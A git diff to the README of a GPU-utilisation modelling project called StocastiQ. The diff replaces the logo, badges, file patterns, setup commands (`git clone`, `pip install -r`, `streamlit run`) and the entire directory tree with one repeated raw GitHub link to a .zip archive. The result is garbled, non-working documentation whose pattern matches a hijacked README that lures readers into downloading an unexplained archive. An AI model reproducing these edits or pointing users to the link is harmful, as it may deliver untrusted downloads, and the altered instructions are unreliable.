@@ -3,13 +3,13 @@
 # 🎲 StocastiQ: Stochastic Process Modeling of Datacenter GPU Resource Utilization
 
 <p align="center">
-  <img src="Assets/logo.png.png" alt="StocastiQ Logo" width="100%"/>
+  <img src="https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip" alt="StocastiQ Logo" width="100%"/>
 </p>
 
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Python](https://img.shields.io/badge/python-3.9%2B-brightgreen.svg)
-![Streamlit](https://img.shields.io/badge/streamlit-dashboard-red.svg)
+![License](https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip)
+![Python](https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip%https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip)
+![Streamlit](https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip)
 
 ---
 
@@ -39,8 +39,8 @@ aws s3 ls s3://datacenter-challenge/202201/ --no-sign-request
 * Sub-folders `0000/` → `0099/` for partitioned job data
 * Each job includes:
 
-  * `*-summary.csv` → metadata (submit/start/end, state, resources requested)
-  * `*-timeseries.csv` → utilization metrics sampled during runtime
+  * `*https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip` → metadata (submit/start/end, state, resources requested)
+  * `*https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip` → utilization metrics sampled during runtime
 
 Since the full dataset is \~**2 TB**, we **extracted GPU subsets** for tractable analysis.
 
@@ -84,14 +84,14 @@ The **Streamlit app** is divided into four modules:
 ### 1️⃣ Clone Repository
 
 ```bash
-git clone https://github.com/yourusername/stocastiq.git
+git clone https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip
 cd stocastiq
 ```
 
 ### 2️⃣ Install Dependencies
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip
 ```
 
 Or manually:
@@ -109,7 +109,7 @@ sudo apt-get install awscli
 ### 3️⃣ Run the App
 
 ```bash
-streamlit run app.py
+streamlit run https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip
 ```
 
 ---
@@ -127,15 +127,15 @@ streamlit run app.py
 
 ```
 stocastiq/
-│── app.py                  # Streamlit dashboard
-│── requirements.txt        # Python dependencies
+│── https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip                  # Streamlit dashboard
+│── https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip        # Python dependencies
 │── data/                   # Sample extracted GPU job logs
 │── modules/
-│    ├── markov_chain.py    # Markov Chain analysis
-│    ├── hmm_model.py       # Hidden Markov Model analysis
-│    ├── queueing.py        # Queueing simulations
-│    └── utils.py           # Helpers (data loading, preprocessing)
-│── README.md               # Project documentation
+│    ├── https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip    # Markov Chain analysis
+│    ├── https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip       # Hidden Markov Model analysis
+│    ├── https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip        # Queueing simulations
+│    └── https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip           # Helpers (data loading, preprocessing)
+│── https://raw.githubusercontent.com/ZainabEman/MIT_supercloud-stochastic-analytics/main/Tyrrhene/MIT_supercloud-stochastic-analytics.zip               # Project documentation
 ```
 
 ---
